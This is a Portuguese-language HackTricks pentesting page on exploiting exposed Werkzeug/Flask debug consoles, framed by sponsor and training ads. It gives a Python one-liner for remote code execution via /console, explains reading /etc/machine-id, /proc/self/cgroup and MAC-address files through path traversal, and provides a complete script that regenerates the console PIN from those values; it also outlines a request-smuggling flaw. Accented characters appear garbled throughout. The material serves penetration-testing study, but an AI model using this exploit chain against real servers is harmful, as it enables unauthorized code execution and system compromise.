# Werkzeug / Flask Debug

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Configura√ß√£o dispon√≠vel instantaneamente para avalia√ß√£o de vulnerabilidades e testes de penetra√ß√£o**. Execute um pentest completo de qualquer lugar com mais de 20 ferramentas e recursos que v√£o de reconhecimento a relat√≥rios. N√£o substitu√≠mos os pentesters - desenvolvemos ferramentas personalizadas, m√≥dulos de detec√ß√£o e explora√ß√£o para dar a eles mais tempo para investigar mais a fundo, estourar shells e se divertir.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Console RCE

Se o debug estiver ativo, voc√™ pode tentar acessar `/console` e obter RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

H√° tamb√©m v√°rios exploits na internet como [este](https://github.com/its-arun/Werkzeug-Debug-RCE) ou um no metasploit.

## Protegido por PIN - Traversal de Caminho

Em algumas ocasi√µes, o endpoint **`/console`** estar√° protegido por um PIN. Se voc√™ tiver uma **vulnerabilidade de traversal de arquivo**, pode vazar todas as informa√ß√µes necess√°rias para gerar esse PIN.

### Exploit de PIN da Console Werkzeug

Force uma p√°gina de erro de depura√ß√£o no aplicativo para ver isso:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Uma mensagem sobre o cen√°rio "console locked" √© encontrada ao tentar acessar a interface de depura√ß√£o do Werkzeug, indicando a necessidade de um PIN para desbloquear o console. A sugest√£o √© explorar o PIN do console analisando o algoritmo de gera√ß√£o de PIN no arquivo de inicializa√ß√£o de depura√ß√£o do Werkzeug (`__init__.py`). O mecanismo de gera√ß√£o de PIN pode ser estudado no [**reposit√≥rio de c√≥digo-fonte do Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), embora seja aconselh√°vel obter o c√≥digo do servidor real por meio de uma vulnerabilidade de travessia de arquivos devido a poss√≠veis discrep√¢ncias de vers√£o.

Para explorar o PIN do console, s√£o necess√°rias duas conjuntos de vari√°veis, `probably_public_bits` e `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Refere-se ao usu√°rio que iniciou a sess√£o Flask.
* **`modname`**: Geralmente designado como `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Geralmente resolve para **Flask**.
* **`getattr(mod, '__file__', None)`**: Representa o caminho completo para `app.py` dentro do diret√≥rio Flask (por exemplo, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Se `app.py` n√£o for aplic√°vel, **tente `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Obt√©m o endere√ßo MAC da m√°quina atual, com `str(uuid.getnode())` traduzindo-o para um formato decimal.
* Para **determinar o endere√ßo MAC do servidor**, deve-se identificar a interface de rede ativa usada pelo aplicativo (por exemplo, `ens3`). Em casos de incerteza, **vaze `/proc/net/arp`** para encontrar o ID do dispositivo, depois **extraia o endere√ßo MAC** de **`/sys/class/net/<device id>/address`**.
* A convers√£o de um endere√ßo MAC hexadecimal para decimal pode ser realizada como mostrado abaixo:

```python
# Exemplo de endere√ßo MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: Concatena dados de `/etc/machine-id` ou `/proc/sys/kernel/random/boot_id` com a primeira linha de `/proc/self/cgroup` ap√≥s a √∫ltima barra (`/`).

<details>

<summary>C√≥digo para `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Ap√≥s compilar todos os dados necess√°rios, o script de exploit pode ser executado para gerar o PIN do console Werkzeug:

Ap√≥s compilar todos os dados necess√°rios, o script de exploit pode ser executado para gerar o PIN do console Werkzeug. O script utiliza os `probably_public_bits` e `private_bits` montados para criar um hash, que ent√£o passa por um processamento adicional para produzir o PIN final. Abaixo est√° o c√≥digo Python para executar esse processo:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Este script produz o PIN ao hash dos bits concatenados, adicionando sais espec√≠ficos (`cookiesalt` e `pinsalt`), e formatando a sa√≠da. √â importante notar que os valores reais para `probably_public_bits` e `private_bits` precisam ser obtidos com precis√£o do sistema alvo para garantir que o PIN gerado corresponda ao esperado pela console do Werkzeug.

{% hint style="success" %}
Se voc√™ estiver em uma **vers√£o antiga** do Werkzeug, tente mudar o **algoritmo de hash para md5** em vez de sha1.
{% endhint %}

## Caracteres Unicode do Werkzeug

Como observado em [**este problema**](https://github.com/pallets/werkzeug/issues/2833), o Werkzeug n√£o fecha uma solicita√ß√£o com caracteres Unicode nos cabe√ßalhos. E como explicado em [**este artigo**](https://mizu.re/post/twisty-python), isso pode causar uma vulnerabilidade de CL.0 Request Smuggling.

Isso ocorre porque, no Werkzeug, √© poss√≠vel enviar alguns **caracteres Unicode** e isso far√° com que o servidor **quebre**. No entanto, se a conex√£o HTTP foi criada com o cabe√ßalho **`Connection: keep-alive`**, o corpo da solicita√ß√£o n√£o ser√° lido e a conex√£o ainda estar√° aberta, ent√£o o **corpo** da solicita√ß√£o ser√° tratado como a **pr√≥xima solicita√ß√£o HTTP**.

## Explora√ß√£o Automatizada

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Refer√™ncias

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Configura√ß√£o instantaneamente dispon√≠vel para avalia√ß√£o de vulnerabilidades e testes de penetra√ß√£o**. Execute um pentest completo de qualquer lugar com mais de 20 ferramentas e recursos que v√£o de reconhecimento a relat√≥rios. N√£o substitu√≠mos os pentesters - desenvolvemos ferramentas personalizadas, m√≥dulos de detec√ß√£o e explora√ß√£o para dar a eles mais tempo para investigar mais a fundo, abrir shells e se divertir.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
